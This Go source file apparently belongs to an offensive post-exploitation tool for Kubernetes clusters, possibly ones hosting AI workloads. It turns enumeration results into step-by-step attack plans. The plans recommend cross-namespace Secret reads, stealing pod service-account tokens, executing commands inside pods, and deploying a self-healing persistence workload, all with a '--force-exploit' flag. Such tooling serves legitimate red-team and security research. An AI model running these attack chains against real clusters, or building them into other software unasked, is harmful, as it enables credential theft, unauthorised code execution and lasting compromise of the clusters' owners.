package main

import "github.com/professor-moody/aipostex/pkg/exploit/k8s"

// buildK8sEnumWorkflowPlan turns a completed k8s enum into concrete follow-on
// commands. The enum discovered real namespaces and workloads, so access-review /
// sa-loot / pod-exec name a discovered namespace that actually hosts a workload
// instead of emitting a "<namespace>" placeholder. The pod-scoped exploit steps
// (sa-loot / pod-exec) are only emitted when enum actually found a workload —
// they need a live pod, so a placeholder command there would be a false lead.
func buildK8sEnumWorkflowPlan(target string, namespaces []string, workloads []k8s.Workload) workflowPlan {
	target = canonicalServiceURL(target)
	// Prefer a namespace we KNOW hosts a workload (that namespace has pods to
	// loot/exec and secrets worth reading); fall back to the first discovered
	// namespace. k8s enum always resolves at least one namespace, so this only
	// falls back to the "<namespace>" placeholder in the degenerate zero-namespace
	// case — and the pod-scoped steps below are gated on a real workload anyway.
	ns := k8sWorkloadNamespace(workloads)
	if ns == "" {
		ns = firstOrPlaceholder(namespaces, "<namespace>")
	}
	// Namespace + workload names come from the API server (target-controlled), so
	// render them shell-safe before they enter copy-pasteable commands.
	ns = shellSafeArg(ns)

	recs := []workflowRecommendation{
		newWorkflowRecommendation(formatCommandExample("k8s --target "+target+" --insecure access-review --namespace "+ns), "Map the current identity's real authorization in a discovered namespace (SelfSubjectRulesReview).", false, 10),
		newWorkflowRecommendation(formatCommandExample("k8s --target "+target+" --insecure secret-read --all-namespaces --force-exploit"), "Read Secret objects across the discovered namespaces (e.g. model-registry credentials).", true, 20),
	}
	// A discovered workload means the namespace has pods — only then are the
	// pod-scoped token-theft / exec steps concrete and worth suggesting.
	if len(workloads) > 0 {
		recs = append(recs,
			newWorkflowRecommendation(formatCommandExample("k8s --target "+target+" --insecure sa-loot --namespace "+ns+" --force-exploit"), "Exec-steal a discovered pod's service-account token and measure the privilege delta.", true, 30),
			newWorkflowRecommendation(formatCommandExample("k8s --target "+target+" --insecure pod-exec --namespace "+ns+" --command id --force-exploit"), "Run a command inside a discovered pod to confirm code execution.", true, 40),
		)
	}

	return workflowPlan{
		Target:          target,
		Stage:           "correlation",
		Landed:          "reachable",
		ChainSource:     "k8s-enum",
		Rationale:       "Enumerated namespaces and workloads anchor identity review, cross-namespace secret reads, and pod-scoped service-account theft / execution.",
		Recommendations: recs,
	}
}

// k8sWorkloadNamespace returns the namespace of the first enumerated workload.
// That namespace is known to host pods, so sa-loot / pod-exec have a live target.
func k8sWorkloadNamespace(workloads []k8s.Workload) string {
	for _, wl := range workloads {
		if wl.Namespace != "" {
			return wl.Namespace
		}
	}
	return ""
}

// buildK8sExploitWorkflowPlan chains the read/authz k8s verbs into the escalation
// path. It is emitted only for the verbs that otherwise dead-end (rbac-probe,
// access-review, pod-exec); the credential-emitting verbs (secret-read, sa-loot,
// artifact-read) already surface stolen-token Next Actions through the credential
// chain, so they are left to that path to avoid double-rendering.
func buildK8sExploitWorkflowPlan(target, action, namespace string) workflowPlan {
	target = canonicalServiceURL(target)
	base := "k8s --target " + target + " --insecure "
	nsArg := ""
	if namespace != "" {
		nsArg = " --namespace " + shellSafeArg(namespace)
	}
	rec := func(cmd, why string, gated bool, prio int) workflowRecommendation {
		return newWorkflowRecommendation(formatCommandExample(cmd), why, gated, prio)
	}
	var stage, rationale string
	var recs []workflowRecommendation
	switch action {
	case "rbac-probe":
		stage = "access"
		rationale = "The identity's RBAC posture is mapped; review its effective authorization, then read secrets and steal a pod's service-account token."
		recs = []workflowRecommendation{
			rec(base+"access-review"+nsArg, "Map the current identity's effective authorization (SelfSubjectRulesReview).", false, 10),
			rec(base+"secret-read --all-namespaces --force-exploit", "Read Secret objects across namespaces if list-secrets is permitted.", true, 20),
			rec(base+"sa-loot"+nsArg+" --force-exploit", "Exec-steal a pod's service-account token and measure the privilege delta.", true, 30),
		}
	case "access-review":
		stage = "access"
		rationale = "The identity's effective authorization is known; act on what it permits — read secrets, steal a service-account token, or execute in a pod."
		recs = []workflowRecommendation{
			rec(base+"secret-read"+nsArg+" --force-exploit", "Read Secret objects in this namespace.", true, 10),
			rec(base+"sa-loot"+nsArg+" --force-exploit", "Exec-steal a pod's service-account token and measure the privilege delta.", true, 20),
			rec(base+"pod-exec"+nsArg+" --command id --force-exploit", "Run a command inside a pod to confirm code execution.", true, 30),
		}
	case "pod-exec":
		stage = "own"
		rationale = "Code execution in a pod is confirmed; mine the pod's identity, then persist."
		recs = []workflowRecommendation{
			rec(base+"sa-loot"+nsArg+" --force-exploit", "Exec-steal this pod's mounted service-account token and measure the privilege delta.", true, 10),
			rec(base+"secret-read --all-namespaces --force-exploit", "Read Secret objects cluster-wide with the stolen identity.", true, 20),
			rec(base+"persist"+nsArg+" --force-exploit", "Deploy a self-healing persistence workload with the current/stolen identity.", true, 30),
		}
	case "persist":
		stage = "own"
		rationale = "A persistence workload is deployed; confirm it is present and running."
		recs = []workflowRecommendation{
			rec(base+"enum"+nsArg, "Enumerate workloads to confirm the aipostex-persist Deployment is present and running.", false, 10),
		}
	default:
		return workflowPlan{}
	}
	return workflowPlan{
		Target:          target,
		Stage:           stage,
		Landed:          "influenced",
		ChainSource:     "k8s-" + action,
		Rationale:       rationale,
		Recommendations: recs,
	}
}
